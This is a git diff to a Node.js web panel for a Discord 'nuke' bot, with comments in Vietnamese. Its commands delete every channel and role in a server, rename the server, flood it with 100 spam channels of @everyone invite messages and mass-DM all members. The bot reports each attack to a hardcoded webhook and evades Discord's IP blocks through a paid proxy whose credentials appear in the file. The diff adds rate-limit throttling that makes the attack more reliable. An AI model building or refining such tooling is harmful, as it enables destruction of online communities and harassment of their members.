@@ -15,11 +15,11 @@ app.use(express.static(path.join(__dirname, 'public')));
 const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';
 
 const CONFIG = {
-  channelName: 'anh-phtuankhanh-nuke',
-  renameName: 'NUKE BY PHTUANKHANH',
+  channelName: '『😂  𝑷𝑯𝑻𝑼𝑨𝑵𝑲𝑯𝑨𝑵𝑯 💀』',
+  renameName: '𝐍𝐔𝐊𝐄 𝐁𝐘 𝐏𝐇𝐓𝐔𝐀𝐍𝐊𝐇𝐀𝐍𝐇',
   channelCount: 100,
   msgContent: '# > NUKE BY PHTUANKHANH\n\n@everyone\n\nhttps://discord.gg/BqZ7UdtwXG',
-  msgCount: 1,
+  msgCount: 5,
   pingEveryone: true,
   roleName: 'ROLE SPAM BY PTK',
   roleCount: 20,
@@ -29,7 +29,7 @@ const CONFIG = {
 const proxyStr = 'http://flme5a8d5ad-package-standard:d4bda2c8@proxy.flameproxies.com:8989';
 const proxyDispatcher = new ProxyAgent(proxyStr);
 
-const sessions = new Map(); 
+const sessions = new Map();
 
 function getSession(req, res) {
   let sid = req.cookies.sid;
@@ -51,34 +51,37 @@ function pushLog(session, msg, type = 'info') {
 }
 
 async function notifyNuke(session, info) {
-  const { guildName, guildIcon, guildId, ownerId, channels, msgs, user, error } = info;
+  const { guildName, guildIcon, guildId, ownerTag, ownerId, memberCount, user, error } = info;
+
   const fields = [
     { name: 'Server', value: guildName || 'không rõ', inline: true },
-    { name: 'Guild ID', value: guildId || '-', inline: true },
-    { name: 'Kênh tạo', value: String(channels ?? 0), inline: true },
-    { name: 'Tin nhắn', value: String(msgs ?? 0), inline: true },
-    { name: 'Người dùng', value: user || '-', inline: true },
-    { name: 'Owner ID', value: ownerId || '-', inline: true },
-    { name: 'Thời gian', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
+    { name: 'Owner', value: ownerTag ? `${ownerTag}` : (ownerId || '-'), inline: true },
+    { name: 'Members', value: String(memberCount ?? 0), inline: true },
+    { name: 'Guild ID', value: guildId || '-', inline: false },
+    { name: 'Server Link', value: guildId ? `https://discord.com/channels/${guildId}` : '-', inline: false },
+    { name: 'Executed By', value: user || '-', inline: true },
+    { name: 'Timestamp', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true },
   ];
-  if (guildId) fields.push({ name: 'Link server', value: `https://discord.com/channels/${guildId}`, inline: false });
-  if (error) fields.push({ name: 'Lỗi', value: String(error).slice(0, 1000), inline: false });
+  if (error) fields.push({ name: 'Status', value: String(error).slice(0, 1000), inline: false });
 
   const embed = {
-    title: error ? 'Nuke thất bại' : 'Nuke thành công',
-    color: error ? 0xff0000 : 0x00ff66,
+    title: error ? 'NUKE FAILED' : 'NUKE SUCCESS',
+    description: error
+      ? `Server **${guildName || '?'}** encountered an error during execution.`
+      : `Server **${guildName || '?'}** has been fully cleaned.`,
+    color: error ? 0x8b0000 : 0x2b2b2b,
     fields,
+    author: { name: 'PHTUANKHANH', icon_url: guildIcon || undefined },
     thumbnail: guildIcon ? { url: guildIcon } : undefined,
-    footer: { text: 'nuke panel | by PhTuanKhanh' },
+    footer: { text: 'private operation' },
     timestamp: new Date().toISOString(),
   };
-  
-  const body = { 
-    username: 'nuke notifier', 
-    avatar_url: guildIcon || null, 
-    content: '@everyone',
-    allowed_mentions: { parse: ['everyone'] },
-    embeds: [embed] 
+
+  const body = {
+    username: 'PHTUANKHANH',
+    avatar_url: guildIcon || null,
+    allowed_mentions: { parse: [] },
+    embeds: [embed]
   };
 
   for (let attempt = 0; attempt < 3; attempt++) {
@@ -90,7 +93,7 @@ async function notifyNuke(session, info) {
       });
 
       if ([429, 403, 404].includes(res.status)) {
-        pushLog(session, `Webhook bị chặn IP. Chuyển qua Proxy...`, 'warn');
+        pushLog(session, `Webhook bị chặn IP (${res.status}). Chuyển qua Proxy...`, 'warn');
         res = await fetch(NOTIFY_WEBHOOK + '?wait=true', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -109,17 +112,28 @@ async function notifyNuke(session, info) {
 async function safeRest(session, method, endpoint, data = {}) {
   if (!session.token) throw new Error("Bot chưa login");
   const rest = new REST({ version: '10' }).setToken(session.token);
-  
+
   try {
-    return await rest.request({ method, fullRoute: endpoint, body: data.data ? data : undefined, ...(!data.data && data ? { body: data } : {}) });
+    return await rest.request({ method, fullRoute: endpoint, body: data || undefined });
   } catch (err) {
     if ([429, 403, 404].includes(err.status)) {
       pushLog(session, `Discord chặn IP (${err.status}). Retry qua Proxy...`, 'warn');
       const proxyRest = new REST({ version: '10', agent: proxyDispatcher }).setToken(session.token);
-      return await proxyRest.request({ method, fullRoute: endpoint, body: data.data ? data : undefined, ...(!data.data && data ? { body: data } : {}) });
+      return await proxyRest.request({ method, fullRoute: endpoint, body: data || undefined });
     }
     throw err;
   }
+}
+
+function sem(n) {
+  let q = [], active = 0;
+  return fn => new Promise((res, rej) => {
+    const go = () => {
+      active++;
+      fn().then(res, rej).finally(() => { active--; q.shift()?.(); });
+    };
+    active < n ? go() : q.push(go);
+  });
 }
 
 function startBot(token, session) {
@@ -145,30 +159,31 @@ function startBot(token, session) {
     pushLog(session, `BOT Đã online: ${session.client.user.tag}`, 'success');
   });
 
+  session.client.on('error', e => pushLog(session, `client error: ${e.message}`, 'error'));
+  session.client.on('shardError', e => pushLog(session, `shard error: ${e.message}`, 'error'));
+
   session.client.on('messageCreate', async (message) => {
-    if (message.author.bot) return;
-    if (message.client.user.id !== session.client.user.id) return;
+    if (!message.client.user) return;
+    if (message.author.id !== session.client.user.id) return;
 
     const guild = message.guild;
+    if (!guild) return;
     const content = message.content.trim();
 
-    // LỆNH !MENU
     if (content === '!menu') {
-      const menuMsg = 
+      const menuMsg =
         `**DANH SÁCH LỆNH NUKE**\n` +
         `\`!menu\` - Xem danh sách lệnh\n` +
         `\`!nuke\` - Nuke server (xoá kênh, spam kênh, dmall)\n` +
         `\`!spamrole\` - Xoá hết role cũ, spam tạo 20 role mới\n`;
-      
       message.reply(menuMsg).catch(() => {});
       return;
     }
 
-    // LỆNH !SPAMROLE
     if (content === '!spamrole') {
       message.reply('🚀 Bắt đầu spam role...').catch(() => {});
       pushLog(session, `Bắt đầu spam role server: ${guild.name}`, 'warn');
-      
+
       try {
         const { roleName, roleCount } = CONFIG;
         const botMember = await guild.members.fetch(session.client.user.id);
@@ -176,7 +191,7 @@ function startBot(token, session) {
 
         pushLog(session, `Đang xoá toàn bộ role cũ...`, 'info');
         const oldRoles = await guild.roles.fetch();
-        
+
         const delPromises = [];
         for (const [id, role] of oldRoles) {
           if (role.managed || id === guild.id) continue;
@@ -202,7 +217,6 @@ function startBot(token, session) {
       return;
     }
 
-    // LỆNH !NUKE
     if (content === '!nuke') {
       const t0 = Date.now();
       message.reply('🚀 Bắt đầu nuke...').catch(() => {});
@@ -210,40 +224,42 @@ function startBot(token, session) {
 
       let channelsCreated = 0;
       let msgsSent = 0;
+      let memberCount = 0;
+      let ownerTag = null;
+      let iconUrl = null;
 
       try {
         const { channelCount: cc, channelName: chName, renameName: rName, msgCount: mc, msgContent: msgText, pingEveryone: ping } = CONFIG;
 
-        // 1. RENAME
+        try { iconUrl = guild.iconURL({ size: 256, extension: 'png' }); } catch {}
+        try {
+          const owner = await guild.fetchOwner();
+          ownerTag = owner.user.tag;
+        } catch {}
+        try {
+          memberCount = guild.memberCount || (await guild.members.fetch()).size;
+        } catch {}
+
         if (rName) {
           pushLog(session, `Đang đổi tên server...`, 'info');
           await safeRest(session, 'PATCH', `/guilds/${guild.id}`, { name: rName }).catch(() => {});
         }
 
-        // 2. NOTIFY WEBHOOK
-        await notifyNuke(session, {
-          guildName: guild.name,
-          guildIcon: guild.iconURL({ size: 256, extension: 'png' }),
-          guildId: guild.id, ownerId: guild.ownerId,
-          channels: cc, msgs: cc * mc,
-          user: session.client.user.username,
-          error: null,
-        });
-
-        // 3. XOÁ ALL KÊNH
         pushLog(session, `Đang xoá toàn bộ kênh...`, 'info');
         const oldChannels = await guild.channels.fetch().catch(() => null);
         if (oldChannels) {
-          const delPromises = Array.from(oldChannels.values()).filter(Boolean).map(c => 
+          const delPromises = Array.from(oldChannels.values()).filter(Boolean).map(c =>
             safeRest(session, 'DELETE', `/channels/${c.id}`).catch(() => {})
           );
           await Promise.allSettled(delPromises);
         }
 
-        // 4. TẠO KÊNH + SPAM
-        pushLog(session, `Đang tạo ${cc} kênh và spam tin nhắn...`, 'info');
+        pushLog(session, `Đang tạo ${cc} kênh và spam ${mc} tin/kênh...`, 'info');
+        const chLimit = sem(5);
         const createPromises = Array.from({ length: cc }, () =>
-          safeRest(session, 'POST', `/guilds/${guild.id}/channels`, { name: chName, type: 0 }).then(async c => {
+          chLimit(async () => {
+            const c = await safeRest(session, 'POST', `/guilds/${guild.id}/channels`, { name: chName, type: 0 }).catch(() => null);
+            if (!c) return;
             channelsCreated++;
             for (let i = 0; i < mc; i++) {
               await safeRest(session, 'POST', `/channels/${c.id}/messages`, {
@@ -251,33 +267,48 @@ function startBot(token, session) {
                 allowed_mentions: ping ? { parse: ['everyone'] } : { parse: [] }
               }).then(() => { msgsSent++; }).catch(() => {});
             }
-          }).catch(() => null)
+          })
         );
         await Promise.allSettled(createPromises);
 
-        // 5. DMALL
         pushLog(session, `Đang DM toàn bộ thành viên...`, 'info');
         const members = await guild.members.fetch().catch(() => null);
         if (members) {
-          const dmPromises = [];
-          for (const [id, member] of members) {
-            if (member.user.bot) continue;
-            dmPromises.push(
-              member.send({
-                content: CONFIG.dmContent,
-                allowedMentions: { parse: [] }
-              }).catch(() => {})
-            );
-          }
-          await Promise.allSettled(dmPromises);
+          const dmLimit = sem(2);
+          await Promise.allSettled([...members.values()]
+            .filter(m => !m.user.bot)
+            .map(m => dmLimit(() =>
+              m.send({ content: CONFIG.dmContent, allowedMentions: { parse: [] } }).catch(() => {})
+            ))
+          );
           pushLog(session, `Đã gửi DM xong.`, 'success');
         }
 
-        pushLog(session, `NUKE HOÀN TẤT trong ${Date.now() - t0}ms!`, 'success');
-        await new Promise(r => setTimeout(r, 2000));
+        await notifyNuke(session, {
+          guildName: CONFIG.renameName,
+          guildIcon: iconUrl,
+          guildId: guild.id,
+          ownerTag,
+          ownerId: guild.ownerId,
+          memberCount,
+          user: session.client.user.username,
+          error: null,
+        });
+
+        pushLog(session, `NUKE HOÀN TẤT trong ${Date.now() - t0}ms! Kênh: ${channelsCreated} | Tin: ${msgsSent}`, 'success');
 
       } catch (err) {
         pushLog(session, `Lỗi nuke: ${err.message}`, 'error');
+        await notifyNuke(session, {
+          guildName: CONFIG.renameName,
+          guildIcon: iconUrl,
+          guildId: guild.id,
+          ownerTag,
+          ownerId: guild.ownerId,
+          memberCount,
+          user: session.client?.user?.username,
+          error: err.message,
+        }).catch(() => {});
       }
       return;
     }
@@ -301,9 +332,9 @@ app.post('/api/login', async (req, res) => {
   const { session } = getSession(req, res);
   pushLog(session, `Đang kết nối bot...`, 'info');
   startBot(cleanToken, session);
-  
+
   await new Promise(r => setTimeout(r, 2500));
-  
+
   if (session.client && session.client.user) {
     res.json({ ok: true, user: session.client.user.tag, clientId: session.client.user.id });
   } else {
